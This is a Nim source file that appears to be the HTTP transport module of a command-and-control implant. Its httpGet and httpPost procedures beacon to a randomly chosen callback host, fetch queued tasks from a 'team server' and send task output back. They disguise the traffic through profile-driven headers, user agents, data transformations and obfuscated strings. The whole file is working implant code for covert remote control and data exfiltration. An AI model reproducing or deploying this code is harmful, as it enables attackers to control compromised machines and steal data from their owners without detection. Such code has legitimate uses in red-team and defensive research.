import httpclient, strformat, strutils, asyncdispatch, base64, tables, parsetoml, random
import ../utils/io
import ../../common/[types, utils, profile]

proc httpGet*(ctx: AgentCtx, heartbeat: seq[byte]): string = 

    let client = newAsyncHttpClient(userAgent = ctx.profile.getString(protect("http-get.user-agent")))
    
    # Apply data transformation
    let payload = ctx.profile.applyDataTransformation(protect("http-get.agent.heartbeat"), heartbeat)
    var body: string = ""

    # Define request headers, as defined in profile
    for header, value in ctx.profile.getTable(protect("http-get.agent.headers")): 
        client.headers.add(header, value.getStringValue())

    # Select a random endpoint to make the request to
    var endpoint = ctx.profile.getString(protect("http-get.endpoints"))
    if endpoint[0] == '/': 
        endpoint = endpoint[1..^1] & "?"    # Add '?' for additional GET parameters

    # Add heartbeat packet to the request
    case ctx.profile.getString(protect("http-get.agent.heartbeat.placement.type")): 
    of protect("header"): 
        client.headers.add(ctx.profile.getString(protect("http-get.agent.heartbeat.placement.name")), payload)
    of protect("query"):
        let param = ctx.profile.getString(protect("http-get.agent.heartbeat.placement.name"))
        endpoint &= fmt"{param}={payload}&"
    of protect("body"): 
        body = payload
    else:
        discard 

    # Define additional request parameters
    for param, value in ctx.profile.getTable(protect("http-get.agent.parameters")): 
        endpoint &= fmt"{param}={value.getStringValue()}&"

    try:
        # Retrieve binary task data from listener and convert it to seq[bytes] for deserialization 
        # Select random callback host
        let hosts = ctx.hosts.split(";")
        let host = hosts[rand(hosts.len() - 1)]
        let response = waitFor client.request(fmt"http://{host}/{endpoint[0..^2]}", HttpGet, body)

        # Check the HTTP status code to determine whether the agent needs to re-register to the team server
        if response.code == Http404: 
            ctx.registered = false

        # Return if no tasks are queued
        let responseBody = waitFor response.body
        if responseBody.len() <= 0: 
            return ""

        # Reverse data transformation
        return Bytes.toString(ctx.profile.reverseDataTransformation(protect("http-get.server.output"), responseBody)) 

    except CatchableError as err:
        # When the listener is not reachable, don't kill the application, but check in at the next time
        print "[-] ", err.msg 
    
    finally:
        client.close()

    return ""

proc httpPost*(ctx: AgentCtx, data: seq[byte]): bool {.discardable.} = 
    
    let client = newAsyncHttpClient(userAgent = ctx.profile.getString(protect("http-post.user-agent")))

    # Define request headers, as defined in profile
    for header, value in ctx.profile.getTable(protect("http-post.agent.headers")): 
        client.headers.add(header, value.getStringValue())
    
    # Select a random endpoint to make the request to
    var endpoint = ctx.profile.getString(protect("http-post.endpoints"))
    if endpoint[0] == '/': 
        endpoint = endpoint[1..^1] & "?"    # Add '?' for additional GET parameters
    
    let requestMethod = parseEnum[HttpMethod](ctx.profile.getString(protect("http-post.request-methods"), protect("POST")))

    # Apply data transformation
    let payload = ctx.profile.applyDataTransformation(protect("http-post.agent.output"), data)
    var body: string = ""

    # Add task result to the request
    case ctx.profile.getString(protect("http-post.agent.output.placement.type")): 
    of protect("header"): 
        client.headers.add(ctx.profile.getString(protect("http-post.agent.output.placement.name")), payload)
    of protect("query"):
        let param = ctx.profile.getString(protect("http-post.agent.output.placement.name"))
        endpoint &= fmt"{param}={payload}&"
    of protect("body"): 
        body = payload  # Set the request body to the "prefix & task output & suffix" construct
    else:
        discard 
        
    # Define additional request parameters
    for param, value in ctx.profile.getTable(protect("http-post.agent.parameters")): 
        endpoint &= fmt"{param}={value.getStringValue()}&"

    try:
        # Send post request to team server
        # Select random callback host
        let hosts = ctx.hosts.split(";")
        let host = hosts[rand(hosts.len() - 1)]
        discard waitFor client.request(fmt"http://{host}/{endpoint[0..^2]}", requestMethod, body)
    
    except CatchableError as err:
        print "[-] ", err.msg 
        return false
    
    finally:
        client.close()

    return true